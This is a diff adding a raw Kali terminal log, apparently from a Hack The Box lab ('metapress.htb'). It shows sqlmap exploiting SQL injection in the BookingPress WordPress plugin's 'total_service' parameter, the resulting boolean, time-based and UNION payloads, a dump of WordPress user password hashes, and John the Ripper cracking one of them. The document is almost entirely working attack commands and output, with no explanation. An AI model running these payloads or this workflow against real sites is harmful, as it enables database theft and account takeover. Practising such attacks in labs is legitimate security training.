@@ -1,0 +1,108 @@
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=ef6d761ae4&category_id=123&total_service=111" -p total_service --level=5 --risk=3 -D blog -T wp_users --dump                                                                            
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:47:56 /2025-09-22/
+
+[22:47:56] [INFO] testing connection to the target URL
+[22:47:56] [INFO] testing if the target URL content is stable
+[22:47:57] [INFO] target URL content is stable
+[22:47:57] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
+[22:47:57] [INFO] testing for SQL injection on POST parameter 'total_service'
+[22:47:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:48:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[22:48:00] [INFO] POST parameter 'total_service' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
+[22:48:01] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[22:48:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[22:48:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[22:48:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[22:48:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[22:48:08] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[22:48:08] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[22:48:08] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[22:48:08] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[22:48:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:48:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:48:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[22:48:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[22:48:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[22:48:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[22:48:08] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:48:09] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[22:48:09] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[22:48:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[22:48:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[22:48:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[22:48:09] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[22:48:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[22:48:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[22:48:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[22:48:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[22:48:09] [INFO] testing 'Generic inline queries'
+[22:48:09] [INFO] testing 'MySQL inline queries'
+[22:48:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[22:48:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[22:48:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[22:48:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[22:48:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[22:48:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[22:48:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:48:19] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[22:48:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:48:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:48:20] [INFO] target URL appears to be UNION injectable with 9 columns
+[22:48:21] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[22:48:21] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+sqlmap identified the following injection point(s) with a total of 132 HTTP(s) requests:
+---
+Parameter: total_service (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=ef6d761ae4&category_id=123&total_service=-3094) OR 4535=4535-- FJub
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=ef6d761ae4&category_id=123&total_service=111) AND (SELECT 2683 FROM (SELECT(SLEEP(5)))TdkM)-- NwvE
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=ef6d761ae4&category_id=123&total_service=111) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x694e534d4a47444a7747754b617547494c516b5956475742426a72654d6a6a6863585a4e684a794a,0x716b7a6b71),NULL,NULL,NULL-- -
+---
+[22:48:27] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.24, Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[22:48:27] [INFO] fetching columns for table 'wp_users' in database 'blog'
+[22:48:27] [INFO] fetching entries for table 'wp_users' in database 'blog'
+[22:48:27] [INFO] recognized possible password hashes in column 'user_pass'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat /tmp/sqlmap981hy7wm64474/sqlmaphashes-uwneqdb4.txt
+admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash         
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+partylikearockstar (manager)     
+1g 0:00:00:14 4.23% (ETA: 22:59:30) 0.06844g/s 47724p/s 55293c/s 55293C/s angels98..angel1028
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session aborted
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
